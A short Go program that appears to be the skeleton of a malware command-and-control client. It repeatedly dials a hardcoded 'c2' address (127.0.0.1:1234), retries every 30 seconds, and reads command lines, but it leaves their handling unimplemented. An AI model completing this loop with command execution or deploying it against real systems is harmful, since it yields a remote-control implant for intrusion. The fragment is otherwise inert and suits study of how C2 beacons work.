package main

import (
    "bufio"
    "net"
    "strings"
    "time"
)

const c2 string = "127.0.0.1:1234"

func main() {
    conn := connectHome()
    defer conn.Close() // Close the connection when main function exits
    
    // Create a scanner to read input from the connection
    scanner := bufio.NewScanner(conn)

    // Continuously read commands from the connection
    for scanner.Scan() {
        cmd := scanner.Text()
        cmd = strings.TrimSpace(cmd)
        // Do something with the command (not specified in the provided code)
    }

    // Check if there was an error reading from the connection
    if err := scanner.Err(); err != nil {
        // Handle the error (not specified in the provided code)
    }
}

func connectHome() net.Conn {
    conn, err := net.Dial("tcp", c2)
    if err != nil {
        // Sleep for 30 seconds before attempting to reconnect
        time.Sleep(time.Second * 30)
        // Recursively call connectHome to retry connection
        return connectHome()
    }
    return conn
}
